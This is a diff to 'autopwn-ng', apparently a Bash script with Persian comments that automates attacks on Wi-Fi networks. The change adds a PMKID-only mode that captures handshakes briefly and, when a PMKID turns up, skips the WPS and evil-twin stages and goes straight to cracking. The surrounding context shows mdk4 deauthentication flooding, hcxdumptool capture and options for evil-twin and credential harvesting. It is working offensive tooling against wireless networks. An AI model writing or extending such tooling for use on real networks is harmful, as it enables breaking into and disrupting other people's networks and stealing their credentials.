@@ -4,7 +4,7 @@
 #  استفاده: sudo autopwn-ng [-p profile] [-t seconds] [-i iface] [-w wordlist]
 #           [-d dictdir] [--no-wps] [--no-twin] [--no-post] [--no-harvest]
 #           [--harvest-time N] [--target BSSID] [--auto] [--resume]
-#           [--dry-run|--simulate]
+#           [--pmkid-only] [--dry-run|--simulate]
 #  پروفایل: stealth | normal | brute
 # ==========================================================================
 set -uo pipefail
@@ -26,6 +26,7 @@ TARGET=""
 DRY_RUN=0
 AUTO=0
 RESUME=0
+PMKID_ONLY=0
 WLIMIT=3
 CHECKPOINT="/tmp/autopwn-ng.checkpoint"
 PMKID_N=0
@@ -61,6 +62,7 @@ while [ $# -gt 0 ]; do
     --dry-run|--simulate) DRY_RUN=1; shift;;
     --auto) AUTO=1; shift;;
     --resume) RESUME=1; shift;;
+    --pmkid-only) PMKID_ONLY=1; shift;;
     -h|--help) sed -n '2,8p' "$0"; exit 0;;
     *) err "گزینه ناشناس: $1"; exit 1;;
   esac
@@ -80,6 +82,12 @@ if [ "$AUTO" -eq 1 ]; then
   PROFILE=normal
   CAPTURE=90
   ok "حالت خودکار: اسکن + برداشت از همه + کرک + گزارش"
+fi
+
+# حالت PMKID-only: برداشت کوتاه، در صورت یافتن PMKID مستقیم به کرک
+if [ "$PMKID_ONLY" -eq 1 ]; then
+  (( CAPTURE_EXPLICIT == 0 )) && CAPTURE=15
+  ok "حالت PMKID-only: برداشت ${CAPTURE}s، در صورت یافتن PMKID مستقیم به کرک"
 fi
 
 # ---------- تابع ذخیرهٔ checkpoint ----------
@@ -131,6 +139,7 @@ print_plan() {
   echo "Capture: ${CAPTURE:-120}s"
   echo "Workload: $WLIMIT"
   [ "$AUTO" -eq 1 ] && echo "Mode: auto (one-click)"
+  [ "$PMKID_ONLY" -eq 1 ] && echo "Mode: PMKID-only (fast path, ${CAPTURE}s capture)"
   [ "$RESUME" -eq 1 ] && echo "Mode: resume (skip to phase $SKIP_TO)"
   [ -n "$TARGET" ] && echo "Target: $TARGET"
   [ -n "$IFACE" ] && echo "Interface: $IFACE"
@@ -305,8 +314,8 @@ else
   err "نسخه hcxdumptool ناشناخته."; exit 1
 fi
 
-# دِاوث دوره‌ای با mdk4 برای اجبار به reassociation
-if command -v mdk4 >/dev/null; then
+# دِاوث دوره‌ای با mdk4 برای اجبار به reassociation (در PMKID-only غیرفعال)
+if [ "$PMKID_ONLY" -ne 1 ] && command -v mdk4 >/dev/null; then
   ( sleep 5; exec mdk4 "$MON" d -b "$WORK/blacklist" ) >/dev/null 2>&1 &
   MDK_PID=$!
 fi
@@ -355,6 +364,15 @@ PMKID_N=${PMKID_N:-0}
 EAPOL_N=${EAPOL_N:-0}
 EAP_N=${EAP_N:-0}
 ok "PMKID: $PMKID_N | EAPOL: $EAPOL_N | Enterprise: $EAP_N"
+
+# در حالت PMKID-only، اگر PMKID یافت شد مستقیم به کرک برو (رد WPS/Evil-Twin)
+if [ "$PMKID_ONLY" -eq 1 ] && [ "${PMKID_N:-0}" -gt 0 ]; then
+  ok "PMKID یافت شد ($PMKID_N) — رد کردن WPS/Evil-Twin، مستقیم به کرک."
+  DO_WPS=0
+  DO_TWIN=0
+elif [ "$PMKID_ONLY" -eq 1 ]; then
+  warn "PMKID یافت نشد؛ ادامه با مسیر کامل (WPS/Evil-Twin فعال)."
+fi
 
   save_checkpoint 3
 fi
